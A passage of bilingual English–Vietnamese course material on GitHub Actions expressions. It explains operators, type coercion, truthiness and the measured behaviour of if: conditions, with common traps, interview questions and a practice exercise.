<div class="kv"><span class="k">logic</span><span class="v"><code>&amp;&amp;</code> <code>||</code> <code>!</code>. These return one of their <em>operands</em>, not a boolean, so <code>a || b</code> is a usable default-value idiom</span></div>
<div class="kv"><span class="k">access</span><span class="v"><code>a.b</code>, <code>a['b']</code>, <code>a[0]</code>, and <code>a.*</code> which collects a property from every element of an array</span></div>
<div class="kv"><span class="k">grouping</span><span class="v">parentheses. Worth using freely — <code>&amp;&amp;</code> binds tighter than <code>||</code> and a mixed condition is easy to misread</span></div>
</div>

<h3>Coercion, as documented</h3>
${slide('ga-03', 15, 'Comparing different types: both are coerced to a NUMBER')}

<p>Before comparing two values of different types, both are converted to numbers. The rules are published rather than measurable from outside GitHub, so this table is from the documentation:</p>

<div class="out">gia tri        -> so
-----------------------------
null           -> 0
true           -> 1
false          -> 0
''             -> 0
'123'          -> 123
'0x1'          -> 1        (dang so hop le)
'abc'          -> NaN
mang / doi tuong -> NaN</div>

<p>Coercion only happens when the two sides are <em>different</em> types — <code>'abc' == 'abc'</code> is a plain string comparison and is true. It is the mixed comparison that surprises: <code>'abc' == 0</code> coerces the left side to <code>NaN</code>, and <code>NaN</code> is unequal to everything, so the result is false no matter what number you put on the right. The rule worth holding on to is simpler than the table: <strong>a comparison that mixes a string with a number is answering a question you did not ask.</strong> Compare strings to strings.</p>

<div class="callout">
<p><strong>Truthiness, which is the part that matters:</strong> the values that are <em>false</em> are <code>false</code>, <code>0</code>, <code>-0</code>, <code>''</code>, and <code>null</code>. Everything else is true. In particular the string <code>'false'</code> is true, the string <code>'0'</code> is true, and an empty array is true.</p>
${slide('ga-03', 16, 'True/false: only five values are false — the string ’false’ is TRUE')}

</div>

<h3>The measurement, corrected: what <code>if:</code> actually does</h3>
${slide('ga-03', 18, '17 ways to write if: and their real result on the runner')}
<div class="callout warn">
<p><strong>Correction, 24/09/2026.</strong> An earlier version of this section printed a table from a Python YAML parser and concluded that <code>if: 'false'</code> runs the step and <code>if: off</code> disables it. Both are wrong about GitHub. GitHub does not parse <code>if:</code> the way a generic YAML 1.1 parser does — it evaluates the value as an expression. Seventeen forms were run for real on the sandbox (<a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36000180005" target="_blank" rel="noopener">run 36000180005</a>), and the results are below.</p>
</div>
<p>What actually skips the step:</p>
<div class="out">if: false            if: 'false'          if: "false"          -> SKIPPED
if: 0                if: '0'              if: &#36;{{ '0' }}       -> SKIPPED
if: &#36;{{ false }}      if: &#36;{{ 'false' }}                        -> SKIPPED</div>
<p>Read that carefully: <code>if: 'false'</code> is <strong>skipped</strong>, not run. The quotes are YAML&#39;s; GitHub then reads the text <code>false</code> as an expression, and the expression <code>false</code> is false. The old claim was the reverse.</p>
<div class="pitfall co-tieu-de">
<p><strong>The real trap — text outside the braces makes a condition always true.</strong> These two ran the step on <em>every</em> branch:</p>
<div class="out">if: &#36;{{ false }} == true                                    -> RUNS
if: &#36;{{ github.ref_name }} == 'khong-phai-nhanh-nay'        -> RUNS</div>
<p>The moment there is text outside <code>&#36;{{ }}</code>, GitHub is no longer evaluating an expression — it is building a string by concatenation. <code>&#36;{{ github.ref_name }} == '...'</code> becomes something like <code>ch03 == '...'</code>, a non-empty string, which is truthy. actionlint flags this exact shape: <em>"is always evaluated to true because extra characters are around &#36;{{ }}"</em>. Compare the whole thing as one expression instead: <code>if: github.ref_name == 'khong-phai-nhanh-nay'</code> was correctly skipped.</p>
</div>
<p>And <code>if: off</code> / <code>if: no</code> do not disable anything — they make the <em>file invalid</em>. GitHub reads <code>off</code> as an attempted variable name: <em>"Unrecognized named-value: 'off'"</em> (<a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36000816501" target="_blank" rel="noopener">run 36000816501</a>), the run is red at 0 seconds. GitHub uses YAML 1.2 semantics for values here, where <code>off</code> is just a word; the old advice to write <code>if: off</code> to disable a step would break the whole workflow.</p>
<div class="callout">
<p><strong>The habit that survives all of this:</strong> a condition meant to <em>disable</em> something is verified by looking at a real run that shows the step skipped, never by reading the file. The run page marks skipped steps explicitly; the YAML cannot tell you whether GitHub agreed with you.</p>
</div>

<h3>The coercion rules, measured</h3>
<p>The table above is documented; here it is confirmed on real runs (<a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36000179987" target="_blank" rel="noopener">run 36000179987</a>). Predict each line before reading the result:</p>
<div class="out">'0' == 0      true       'abc' == 0     false
'' == 0       true       'abc' != 0     true
null == 0     true       'false' == false   false
null == ''    true       'true'  == true    false
' 1 ' == 1    true       '0x1' == 1     true
'1e2' == 100  true       'abc' == 'ABC'     true</div>
<p>Two lines are worth stopping on. <code>'true' == true</code> is <strong>false</strong>: the two sides differ in type, so <code>'true'</code> is coerced to a number, is not a legal number, becomes <code>NaN</code>, and <code>NaN</code> equals nothing. And <code>'abc' == 'ABC'</code> is <strong>true</strong>: GitHub compares strings case-insensitively. That last one bites in a place you would not expect — branch names. In git, <code>Release</code> and <code>release</code> are two different branches; to an Actions <code>==</code> they are the same. If a branch check must be exact, compare in the shell (<code>[ "$A" = "$B" ]</code>), not in an expression.</p>
<h3>Default values with <code>||</code></h3>
<p>Because <code>||</code> returns an operand rather than a boolean, it is the idiomatic way to supply a fallback:</p>

<pre><code><span class="tok-comment"># neu inputs.version rong thi lay 'latest'</span>
tag: &#36;{{ inputs.version || 'latest' }}

<span class="tok-comment"># chon theo nhanh</span>
moi_truong: &#36;{{ github.ref == 'refs/heads/main' &amp;&amp; 'production' || 'staging' }}</code></pre>

<div class="pitfall">
<p><strong>Trap — the ternary idiom breaks when the middle value is falsy.</strong> <code>cond &amp;&amp; A || B</code> reads like <code>cond ? A : B</code> and behaves like it <em>only while <code>A</code> is truthy</em>. Write <code>cond &amp;&amp; '' || 'x'</code> and you get <code>'x'</code> whatever <code>cond</code> is, because the empty string is falsy and falls through to the right-hand side. The same trap exists with <code>0</code> and with <code>false</code>. When the true-branch value can be empty, use an explicit <code>if:</code> on the step instead of a clever expression.</p>
</div>

<h3>Status functions, which only exist in <code>if:</code></h3>
<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname"><code>success()</code></span><span class="lz-lnote">true when nothing has failed so far. This is the <strong>implicit default</strong> on every step and job — writing it changes nothing</span></div>
<div class="lz-layer"><span class="lz-lname"><code>failure()</code></span><span class="lz-lnote">true when something earlier failed. Right for a notification step; wrong for log collection, which you want either way</span></div>
<div class="lz-layer"><span class="lz-lname"><code>always()</code></span><span class="lz-lnote">true unconditionally — including after a cancel. Correct for uploading test reports; dangerous on anything that touches the outside world</span></div>
<div class="lz-layer"><span class="lz-lname"><code>cancelled()</code></span><span class="lz-lnote">true when the run was cancelled. <code>&#36;{{ !cancelled() }}</code> is what most people mean when they write <code>always()</code>, and it is the safer of the two</span></div>
</div>

<div class="callout warn">
<p><strong>Any status function in a condition replaces the implicit <code>success()</code>.</strong> So <code>if: always() &amp;&amp; github.ref == 'refs/heads/main'</code> runs on the main branch <em>even when an earlier step failed</em> — which is nearly always not what was intended. If you want "on main, and only if things are fine", the condition is just <code>if: github.ref == 'refs/heads/main'</code>, because <code>success()</code> is already there.</p>
</div>

<h3>Comparing things that are not strings</h3>
${slide('ga-03', 20, 'String comparison ignores case — both == and contains')}

<p>Two comparisons come up constantly and both have a right form:</p>

<div class="kv-grid">
<div class="kv"><span class="k">branch</span><span class="v"><code>github.ref == 'refs/heads/main'</code>, not <code>== 'main'</code>. <code>github.ref</code> is a full ref; on a pull request it is <code>refs/pull/&lt;N&gt;/merge</code>, as lesson 1.4 measured</span></div>
<div class="kv"><span class="k">"is this a tag"</span><span class="v"><code>startsWith(github.ref, 'refs/tags/')</code>. There is no <code>github.tag</code></span></div>
<div class="kv"><span class="k">a job&#39;s result</span><span class="v"><code>needs.&lt;job&gt;.result == 'success'</code> — the values are <code>success</code>, <code>failure</code>, <code>cancelled</code>, <code>skipped</code>, as strings</span></div>
<div class="kv"><span class="k">a boolean <code>workflow_dispatch</code> input</span><span class="v">arrives as the <strong>string</strong> <code>'true'</code> or <code>'false'</code>. So <code>if: inputs.co_deploy</code> is true in both cases — compare it: <code>if: inputs.co_deploy == 'true'</code></span></div>
</div>

<div class="callout ok">
<p><strong>The one sentence.</strong> Everything reaches an expression as a string unless YAML made it something else first, and since a non-empty string is true, the two habits that prevent nearly all of these bugs are: compare explicitly rather than relying on truthiness, and confirm a disabling condition by looking at a real run rather than at the file.</p>
</div>

<h3>Common interview questions</h3>
<div class="callout">
<p><strong>Q: <code>if: 'false'</code> — does the step run?</strong><br>A: No, it is skipped. The quotes are YAML&#39;s; GitHub reads the text <code>false</code> as an expression, and <code>false</code> is false. What runs unexpectedly is <code>if: &#36;{{ github.x }} == 'y'</code>, because text outside the braces turns it into a truthy string.</p>
<p><strong>Q: Why is <code>if: inputs.deploy</code> true even when the user picked "false"?</strong><br>A: If the value reached you as a string — a step output, an <code>env</code> value, or <code>github.event.inputs</code> — <code>'false'</code> is a non-empty string, which is truthy. Compare it: <code>== 'true'</code>, or convert with <code>fromJSON()</code>. (A real <code>inputs</code> boolean is fine as-is.)</p>
<p><strong>Q: What does <code>a &amp;&amp; b</code> return?</strong><br>A: An operand, not a boolean — this is why <code>x || 'default'</code> supplies a fallback. The ternary idiom <code>cond &amp;&amp; A || B</code> only works while <code>A</code> is truthy; if <code>A</code> can be empty, use <code>if:</code> on the step or the <code>case()</code> function.</p>
</div>

<h3>🧪 Practice (15–20 min)</h3>
<div class="callout ok"><p><strong>Scenario:</strong> a reviewer claims your <code>if: steps.check.outputs.changed</code> "reads as true or false, so it&#39;s fine". You want to show it is always true.</p><ol>
<li>In a test repository, add a step <code>id: check</code> that writes <code>echo "changed=false" &gt;&gt; "$GITHUB_OUTPUT"</code>. Then four steps: <code>if: steps.check.outputs.changed</code>, <code>if: &#36;{{ steps.check.outputs.changed }}</code>, <code>if: steps.check.outputs.changed == 'true'</code>, <code>if: fromJSON(steps.check.outputs.changed)</code>.</li>
<li>Add a step printing ten coercions through <code>env:</code> (<code>'0' == 0</code>, <code>'true' == true</code>, <code>'abc' == 'ABC'</code>, <code>' 1 ' == 1</code>…). Predict each before you run.</li>
<li>Add <code>if: &#36;{{ github.ref_name }} == 'main'</code> and, separately, <code>if: github.ref_name == 'main'</code>. Run actionlint and read what it says about the first.</li>
<li>Push and compare the skipped/run column with your predictions.</li></ol>
<p><strong>Done when:</strong> the first two <code>changed</code> steps ran and the last two were skipped; your coercion predictions matched; and actionlint flagged the "extra characters around &#36;{{ }}" form as always-true.</p></div>

<h3>🗂 Key terms</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Coercion</span><span class="v">Converting operands to a common type before comparing; here, to a number when the two sides differ.</span></div>
  <div class="kv"><span class="k"><code>NaN</code></span><span class="v">"Not a number": the result of coercing a non-numeric string; equal to nothing, so any relational comparison with it is false.</span></div>
  <div class="kv"><span class="k">Truthy / falsy</span><span class="v">Falsy: <code>false</code>, <code>0</code>, <code>-0</code>, <code>''</code>, <code>null</code>. Everything else is truthy — including <code>'false'</code>, <code>'0'</code>, and an empty array.</span></div>
  <div class="kv"><span class="k">Case-insensitive <code>==</code></span><span class="v">GitHub ignores letter case when comparing strings; <code>'A' == 'a'</code> is true.</span></div>
  <div class="kv"><span class="k">Fails open</span><span class="v">A mistake that makes something happen you meant to prevent, rather than simply not happening.</span></div>
  <div class="kv"><span class="k">Short-circuit <code>&amp;&amp;</code> / <code>||</code></span><span class="v">Return an operand, not a boolean; the basis of the <code>a || 'default'</code> fallback idiom.</span></div>
</div>

<h3>📌 Summary</h3>
<ul>
<li>Different-typed operands are coerced to numbers; a non-numeric string becomes <code>NaN</code>, which equals nothing — so <code>'true' == true</code> is false.</li>
<li>Only five values are falsy; <code>'false'</code>, <code>'0'</code> and an empty array are all truthy.</li>
<li>Measured, not parsed: <code>if: 'false'</code> is skipped. Text outside <code>&#36;{{ }}</code> makes a condition a truthy string, always true.</li>
<li><code>if: off</code> / <code>if: no</code> make the file invalid, not disabled — GitHub reads them as unknown names.</li>
<li>String <code>==</code> is case-insensitive, which matters for branch names; compare in the shell if exactness is required.</li>
<li>A runtime string <code>'false'</code> (step output, env, <code>github.event.inputs</code>) is truthy — compare <code>== 'true'</code> or use <code>fromJSON()</code>.</li>
</ul>

<h3>Sources</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Expressions: operators and type casting</span><span class="lc-sub">docs.github.com/en/actions/learn-github-actions/expressions#operators — the operator precedence table and the exact coercion rules reproduced above, including the NaN cases.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Expressions: status check functions</span><span class="lc-sub">docs.github.com/en/actions/learn-github-actions/expressions#status-check-functions — the four status functions, and the statement that using any of them removes the implicit <code>success()</code>.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">YAML 1.1 type resolution — the bool schema</span><span class="lc-sub">yaml.org/type/bool.html — the list that makes <code>no</code>, <code>off</code> and <code>on</code> booleans. The same page explains lesson 1.1&#39;s <code>on:</code> key, and it explains the last rows of the table above.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">TypeScript — == versus ===, and why coercion tables get memorised</span><span class="lc-sub">/courses/typescript/learn${REF} — the same design decision in a language where you are given a way out; Actions has no strict-equality operator, so the discipline has to come from you.</span></span></div>
</div>
<div class="ml-vi">
<span class="eyebrow">Chương 3 · Bài 3.3</span>
<h2>Toán tử, ép kiểu, và điều kiện hỏng theo hướng MỞ</h2>
<p class="lead">Ngôn ngữ biểu thức nhỏ thôi: so sánh, logic, một nhúm hàm. Thứ khiến nó đáng một bài là nó ÉP KIỂU trước khi so sánh, và phép ép kiểu ấy đẻ ra đúng một kết cục biến một bước đã tắt thành bật lại.</p>

<h3>Các toán tử</h3>
<div class="kv-grid">
<div class="kv"><span class="k">so sánh</span><span class="v"><code>==</code> <code>!=</code> <code>&lt;</code> <code>&lt;=</code> <code>&gt;</code> <code>&gt;=</code>. KHÔNG có toán tử so sánh nghiêm ngặt — <code>==</code> luôn ép kiểu trước</span></div>
<div class="kv"><span class="k">logic</span><span class="v"><code>&amp;&amp;</code> <code>||</code> <code>!</code>. Mấy cái này trả về một trong các <em>TOÁN HẠNG</em> của chúng chứ không trả về boolean, nên <code>a || b</code> là một lối viết giá-trị-mặc-định dùng được</span></div>
<div class="kv"><span class="k">truy cập</span><span class="v"><code>a.b</code>, <code>a['b']</code>, <code>a[0]</code>, và <code>a.*</code> gom một thuộc tính từ mọi phần tử của một mảng</span></div>
<div class="kv"><span class="k">gộp nhóm</span><span class="v">dấu ngoặc đơn. Đáng dùng thoải mái — <code>&amp;&amp;</code> gắn chặt hơn <code>||</code> và một điều kiện trộn thì rất dễ đọc nhầm</span></div>
</div>

<h3>Ép kiểu, theo tài liệu</h3>
${slide('ga-03', 15, 'So sánh khác kiểu: cả hai bị ép thành SỐ')}

<p>Trước khi so sánh hai giá trị khác kiểu, cả hai được chuyển thành SỐ. Các luật này được công bố chứ không đo được từ bên ngoài GitHub, nên bảng dưới đây lấy từ tài liệu:</p>

<div class="out">gia tri        -> so
-----------------------------
null           -> 0
true           -> 1
false          -> 0
''             -> 0
'123'          -> 123
'0x1'          -> 1        (dang so hop le)
'abc'          -> NaN
mang / doi tuong -> NaN</div>

<p>Ép kiểu chỉ xảy ra khi hai phía <em>KHÁC</em> kiểu — <code>'abc' == 'abc'</code> là một phép so sánh chuỗi thuần và nó đúng. Chính phép so sánh TRỘN mới gây bất ngờ: <code>'abc' == 0</code> ép phía trái thành <code>NaN</code>, mà <code>NaN</code> thì khác mọi thứ, nên kết quả là SAI bất kể bạn đặt số nào bên phải. Quy tắc đáng giữ đơn giản hơn cả cái bảng: <strong>một phép so sánh trộn chuỗi với số là đang trả lời một câu hỏi bạn không hề hỏi.</strong> Hãy so chuỗi với chuỗi.</p>

<div class="callout">
<p><strong>Tính đúng-sai, và đây mới là phần quan trọng:</strong> những giá trị SAI là <code>false</code>, <code>0</code>, <code>-0</code>, <code>''</code>, và <code>null</code>. Mọi thứ khác là ĐÚNG. Đặc biệt, chuỗi <code>'false'</code> là ĐÚNG, chuỗi <code>'0'</code> là ĐÚNG, và một mảng rỗng cũng là ĐÚNG.</p>
${slide('ga-03', 16, 'Đúng/sai: chỉ năm giá trị là SAI — chuỗi ’false’ thì ĐÚNG')}

</div>

<h3>Phép đo, đã sửa: <code>if:</code> thật ra LÀM gì</h3>
${slide('ga-03', 18, '17 cách viết if: và kết quả thật trên runner')}
<div class="callout warn">
<p><strong>Đính chính, 24/09/2026.</strong> Bản trước của mục này in một bảng từ bộ đọc YAML của Python rồi kết luận <code>if: 'false'</code> CHẠY bước và <code>if: off</code> TẮT bước. Cả hai đều sai về GitHub. GitHub không đọc <code>if:</code> theo kiểu một bộ YAML 1.1 chung — nó tính giá trị ấy như một BIỂU THỨC. Mười bảy cách viết đã chạy thật trên sân tập (<a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36000180005" target="_blank" rel="noopener">run 36000180005</a>), kết quả bên dưới.</p>
</div>
<p>Cái thật sự bỏ qua bước:</p>
<div class="out">if: false            if: 'false'          if: "false"          -> BỎ QUA
if: 0                if: '0'              if: &#36;{{ '0' }}       -> BỎ QUA
if: &#36;{{ false }}      if: &#36;{{ 'false' }}                        -> BỎ QUA</div>
<p>Đọc kỹ: <code>if: 'false'</code> bị <strong>BỎ QUA</strong>, không chạy. Cặp nháy là của YAML; GitHub sau đó đọc chữ <code>false</code> như một biểu thức, và biểu thức <code>false</code> là sai. Khẳng định cũ nói ngược lại.</p>
<div class="pitfall co-tieu-de">
<p><strong>Bẫy thật — chữ nằm NGOÀI cặp ngoặc làm điều kiện luôn đúng.</strong> Hai cái này chạy bước trên <em>MỌI</em> nhánh:</p>
<div class="out">if: &#36;{{ false }} == true                                    -> CHẠY
if: &#36;{{ github.ref_name }} == 'khong-phai-nhanh-nay'        -> CHẠY</div>
<p>Ngay khi có chữ nằm ngoài <code>&#36;{{ }}</code>, GitHub không còn tính một biểu thức nữa — nó ghép một chuỗi. <code>&#36;{{ github.ref_name }} == '...'</code> thành đại loại <code>ch03 == '...'</code>, một chuỗi khác rỗng, tức là ĐÚNG. actionlint bắt đúng hình dạng này: <em>"is always evaluated to true because extra characters are around &#36;{{ }}"</em>. Hãy so cả cụm như một biểu thức: <code>if: github.ref_name == 'khong-phai-nhanh-nay'</code> đã bị bỏ qua đúng.</p>
</div>
<p>Còn <code>if: off</code> / <code>if: no</code> không tắt gì cả — chúng làm <em>tệp không hợp lệ</em>. GitHub đọc <code>off</code> như một tên biến: <em>"Unrecognized named-value: 'off'"</em> (<a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36000816501" target="_blank" rel="noopener">run 36000816501</a>), run đỏ ở giây 0. GitHub dùng ngữ nghĩa YAML 1.2 cho giá trị ở đây, nơi <code>off</code> chỉ là một chữ; lời khuyên cũ viết <code>if: off</code> để tắt bước sẽ làm hỏng cả workflow.</p>
<div class="callout">
<p><strong>Thói quen sống sót qua tất cả:</strong> một điều kiện nhằm <em>TẮT</em> một thứ gì đó thì kiểm bằng cách nhìn một run thật có hiện bước bị bỏ qua, không bao giờ bằng cách đọc tệp. Trang run đánh dấu rõ bước bị bỏ qua; YAML không cho bạn biết GitHub có đồng ý với bạn hay không.</p>
</div>

<h3>Luật ép kiểu, đo thật</h3>
<p>Bảng bên trên là theo tài liệu; đây là bản đã xác nhận trên run thật (<a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36000179987" target="_blank" rel="noopener">run 36000179987</a>). Đoán từng dòng trước khi đọc kết quả:</p>
<div class="out">'0' == 0      true       'abc' == 0     false
'' == 0       true       'abc' != 0     true
null == 0     true       'false' == false   false
null == ''    true       'true'  == true    false
' 1 ' == 1    true       '0x1' == 1     true
'1e2' == 100  true       'abc' == 'ABC'     true</div>
<p>Hai dòng đáng dừng lại. <code>'true' == true</code> là <strong>SAI</strong>: hai phía khác kiểu, nên <code>'true'</code> bị ép thành số, không phải số hợp lệ, thành <code>NaN</code>, mà <code>NaN</code> bằng không cái gì. Và <code>'abc' == 'ABC'</code> là <strong>ĐÚNG</strong>: GitHub so chuỗi không phân biệt hoa/thường. Cái cuối này cắn ở chỗ bạn không ngờ — tên nhánh. Trong git, <code>Release</code> và <code>release</code> là hai nhánh khác nhau; với <code>==</code> của Actions chúng là một. Nếu một phép kiểm nhánh phải chính xác, hãy so trong shell (<code>[ "$A" = "$B" ]</code>), không so trong biểu thức.</p>
<h3>Giá trị mặc định với <code>||</code></h3>
<p>Vì <code>||</code> trả về một toán hạng chứ không trả về boolean, nó là cách viết quen thuộc để cấp một giá trị dự phòng:</p>

<pre><code><span class="tok-comment"># neu inputs.version rong thi lay 'latest'</span>
tag: &#36;{{ inputs.version || 'latest' }}

<span class="tok-comment"># chon theo nhanh</span>
moi_truong: &#36;{{ github.ref == 'refs/heads/main' &amp;&amp; 'production' || 'staging' }}</code></pre>

<div class="pitfall">
<p><strong>Bẫy — lối viết ba ngôi VỠ khi giá trị ở giữa là SAI.</strong> <code>cond &amp;&amp; A || B</code> đọc lên như <code>cond ? A : B</code> và cư xử đúng như thế <em>CHỈ KHI <code>A</code> là ĐÚNG</em>. Viết <code>cond &amp;&amp; '' || 'x'</code> thì bạn nhận <code>'x'</code> bất kể <code>cond</code> là gì, vì chuỗi rỗng là SAI nên nó rơi xuống phía bên phải. Cùng cái bẫy ấy có với <code>0</code> và với <code>false</code>. Khi giá trị của nhánh-đúng có thể rỗng, hãy dùng một <code>if:</code> tường minh trên bước thay vì một biểu thức khôn khéo.</p>
</div>

<h3>Hàm trạng thái, chỉ tồn tại trong <code>if:</code></h3>
<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname"><code>success()</code></span><span class="lz-lnote">đúng khi chưa có gì hỏng. Đây là <strong>MẶC ĐỊNH NGẦM</strong> trên mọi bước và mọi job — viết nó ra chẳng đổi gì</span></div>
<div class="lz-layer"><span class="lz-lname"><code>failure()</code></span><span class="lz-lnote">đúng khi có thứ gì trước đó hỏng. Đúng cho một bước gửi thông báo; sai cho việc thu thập log, thứ bạn muốn có trong cả hai trường hợp</span></div>
<div class="lz-layer"><span class="lz-lname"><code>always()</code></span><span class="lz-lnote">đúng vô điều kiện — kể cả sau khi bị huỷ. Đúng cho việc tải báo cáo test lên; NGUY HIỂM với bất cứ thứ gì chạm ra thế giới bên ngoài</span></div>
<div class="lz-layer"><span class="lz-lname"><code>cancelled()</code></span><span class="lz-lnote">đúng khi lần chạy bị huỷ. <code>&#36;{{ !cancelled() }}</code> mới là thứ phần lớn người ta muốn khi họ viết <code>always()</code>, và nó an toàn hơn trong hai cái</span></div>
</div>

<div class="callout warn">
<p><strong>Bất kỳ hàm trạng thái nào trong một điều kiện đều THAY THẾ cái <code>success()</code> ngầm định.</strong> Nên <code>if: always() &amp;&amp; github.ref == 'refs/heads/main'</code> sẽ chạy trên nhánh main <em>KỂ CẢ KHI một bước trước đó đã hỏng</em> — và đó gần như luôn không phải điều được định. Nếu bạn muốn "trên main, và chỉ khi mọi thứ ổn", thì điều kiện chỉ là <code>if: github.ref == 'refs/heads/main'</code>, bởi <code>success()</code> vốn đã có sẵn ở đó.</p>
</div>

<h3>So sánh những thứ không phải chuỗi</h3>
${slide('ga-03', 20, 'So chuỗi không phân biệt hoa thường — cả == lẫn contains')}

<p>Hai phép so sánh gặp liên tục và cả hai đều có một dạng đúng:</p>

<div class="kv-grid">
<div class="kv"><span class="k">nhánh</span><span class="v"><code>github.ref == 'refs/heads/main'</code>, không phải <code>== 'main'</code>. <code>github.ref</code> là một ref đầy đủ; trên một pull request nó là <code>refs/pull/&lt;N&gt;/merge</code>, như bài 1.4 đã đo</span></div>
<div class="kv"><span class="k">"đây có phải một tag không"</span><span class="v"><code>startsWith(github.ref, 'refs/tags/')</code>. Không có <code>github.tag</code></span></div>
<div class="kv"><span class="k">kết quả của một job</span><span class="v"><code>needs.&lt;job&gt;.result == 'success'</code> — các giá trị là <code>success</code>, <code>failure</code>, <code>cancelled</code>, <code>skipped</code>, dạng CHUỖI</span></div>
<div class="kv"><span class="k">một tham số boolean của <code>workflow_dispatch</code></span><span class="v">tới nơi dưới dạng <strong>CHUỖI</strong> <code>'true'</code> hoặc <code>'false'</code>. Nên <code>if: inputs.co_deploy</code> là ĐÚNG trong cả hai trường hợp — hãy so sánh nó: <code>if: inputs.co_deploy == 'true'</code></span></div>
</div>

<div class="callout ok">
<p><strong>Một câu.</strong> Mọi thứ tới một biểu thức dưới dạng chuỗi trừ khi YAML đã biến nó thành thứ khác trước, và vì một chuỗi khác rỗng là ĐÚNG, hai thói quen ngăn được gần hết những lỗi này là: SO SÁNH tường minh thay vì dựa vào tính đúng-sai, và XÁC NHẬN một điều kiện tắt bằng cách nhìn một lần chạy thật chứ không nhìn tệp.</p>
</div>

<h3>Câu hỏi phỏng vấn hay gặp</h3>
<div class="callout">
<p><strong>H: <code>if: 'false'</code> — bước có chạy không?</strong><br>Đ: Không, nó bị bỏ qua. Cặp nháy là của YAML; GitHub đọc chữ <code>false</code> như một biểu thức, và <code>false</code> là sai. Cái CHẠY ngoài ý muốn là <code>if: &#36;{{ github.x }} == 'y'</code>, vì chữ ngoài cặp ngoặc biến nó thành một chuỗi đúng.</p>
<p><strong>H: Vì sao <code>if: inputs.deploy</code> đúng kể cả khi người dùng chọn "false"?</strong><br>Đ: Nếu giá trị tới bạn dưới dạng chuỗi — output của bước, giá trị <code>env</code>, hay <code>github.event.inputs</code> — thì <code>'false'</code> là chuỗi khác rỗng, tức là đúng. Hãy so: <code>== 'true'</code>, hoặc đổi kiểu bằng <code>fromJSON()</code>. (Boolean thật trong <code>inputs</code> thì dùng thẳng được.)</p>
<p><strong>H: <code>a &amp;&amp; b</code> trả về gì?</strong><br>Đ: Một toán hạng, không phải boolean — vì thế <code>x || 'default'</code> cấp được giá trị dự phòng. Lối ba ngôi <code>cond &amp;&amp; A || B</code> chỉ chạy đúng khi <code>A</code> là đúng; nếu <code>A</code> có thể rỗng, dùng <code>if:</code> trên bước hoặc hàm <code>case()</code>.</p>
</div>

<h3>🧪 Thực hành (15–20 phút)</h3>
<div class="callout ok"><p><strong>Tình huống:</strong> một người review nói <code>if: steps.check.outputs.changed</code> "đọc lên là true hoặc false nên ổn". Bạn muốn cho thấy nó LUÔN đúng.</p><ol>
<li>Trong một kho thử, thêm một bước <code>id: check</code> ghi <code>echo "changed=false" &gt;&gt; "$GITHUB_OUTPUT"</code>. Rồi bốn bước: <code>if: steps.check.outputs.changed</code>, <code>if: &#36;{{ steps.check.outputs.changed }}</code>, <code>if: steps.check.outputs.changed == 'true'</code>, <code>if: fromJSON(steps.check.outputs.changed)</code>.</li>
<li>Thêm một bước in mười phép ép kiểu qua <code>env:</code> (<code>'0' == 0</code>, <code>'true' == true</code>, <code>'abc' == 'ABC'</code>, <code>' 1 ' == 1</code>…). Đoán từng cái trước khi chạy.</li>
<li>Thêm <code>if: &#36;{{ github.ref_name }} == 'main'</code> và, riêng, <code>if: github.ref_name == 'main'</code>. Chạy actionlint và đọc nó nói gì về cái đầu.</li>
<li>Push và so cột bỏ-qua/chạy với dự đoán của bạn.</li></ol>
<p><strong>Đạt khi:</strong> hai bước <code>changed</code> đầu chạy còn hai bước sau bị bỏ qua; dự đoán ép kiểu của bạn khớp; và actionlint bắt dạng "extra characters around &#36;{{ }}" là luôn đúng.</p></div>

<h3>🗂 Thuật ngữ trong bài</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Ép kiểu (coercion)</span><span class="v">Chuyển các toán hạng về một kiểu chung trước khi so sánh; ở đây, về số khi hai phía khác kiểu.</span></div>
  <div class="kv"><span class="k"><code>NaN</code></span><span class="v">"Không phải số": kết quả của ép một chuỗi không phải số; bằng không cái gì, nên mọi so sánh quan hệ với nó đều sai.</span></div>
  <div class="kv"><span class="k">Đúng / sai (truthy/falsy)</span><span class="v">Sai: <code>false</code>, <code>0</code>, <code>-0</code>, <code>''</code>, <code>null</code>. Mọi thứ khác đúng — kể cả <code>'false'</code>, <code>'0'</code>, và một mảng rỗng.</span></div>
  <div class="kv"><span class="k"><code>==</code> không phân biệt hoa thường</span><span class="v">GitHub bỏ qua hoa/thường khi so chuỗi; <code>'A' == 'a'</code> là đúng.</span></div>
  <div class="kv"><span class="k">Hỏng theo hướng mở</span><span class="v">Một lỗi khiến việc bạn định ngăn lại xảy ra, thay vì đơn giản là không xảy ra.</span></div>
  <div class="kv"><span class="k"><code>&amp;&amp;</code> / <code>||</code> đoản mạch</span><span class="v">Trả về một toán hạng, không phải boolean; là nền của lối viết dự phòng <code>a || 'default'</code>.</span></div>
</div>

<h3>📌 Tóm tắt</h3>
<ul>
<li>Toán hạng khác kiểu bị ép thành số; chuỗi không phải số thành <code>NaN</code>, bằng không cái gì — nên <code>'true' == true</code> là sai.</li>
<li>Chỉ năm giá trị là sai; <code>'false'</code>, <code>'0'</code> và mảng rỗng đều đúng.</li>
<li>Đo thật, không phải phân tích YAML: <code>if: 'false'</code> bị bỏ qua. Chữ ngoài <code>&#36;{{ }}</code> làm điều kiện thành chuỗi đúng, luôn đúng.</li>
<li><code>if: off</code> / <code>if: no</code> làm tệp không hợp lệ, không phải tắt — GitHub đọc chúng như tên lạ.</li>
<li><code>==</code> chuỗi không phân biệt hoa thường, quan trọng với tên nhánh; cần chính xác thì so trong shell.</li>
<li>Chuỗi <code>'false'</code> sinh lúc chạy (output bước, env, <code>github.event.inputs</code>) là đúng — so <code>== 'true'</code> hoặc dùng <code>fromJSON()</code>.</li>
</ul>

